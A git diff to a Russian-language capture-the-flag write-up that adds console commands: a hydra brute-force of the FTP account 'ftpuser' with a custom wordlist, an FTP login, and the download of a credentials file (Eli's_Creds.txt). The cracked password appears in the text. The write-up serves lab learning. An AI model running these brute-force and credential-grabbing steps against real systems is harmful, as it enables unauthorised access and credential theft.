@@ -125,16 +125,30 @@ sudo nano Desktop/rabbit_wordlist.txt
 
 Запускаем hydra, выбираем созданный нами словарь
 
+```console
+hydra -l ftpuser -P Descktop/rabbit_wordlist.txt ftp://your_machine_ip/
+```
+
 ![hydra](screenshots/14.png)
 
 В результате hydra подобрала нам пароль от ftpuser - 5iez1wGXKfPKQ
 
-Попробуем войти при помощи этих данных
+Попробуем войти при помощи этих данных и осмотреться
+
+```console
+ftp your_machine_ip
+```
+```console
+ftp>ls
+```
 
 ![inside](screenshots/15.png)
 
-Мы внутри
-Посмотрим что вокруг нас
+Наблюдаем файл Eli's_Creds.txt, скачаем его
+
+```console
+ftp>get Eli's_Creds.txt
+```
 ![strings_out](screenshots/16.png)
 ![strings_out](screenshots/17.png)
 ![strings_out](screenshots/18.png)
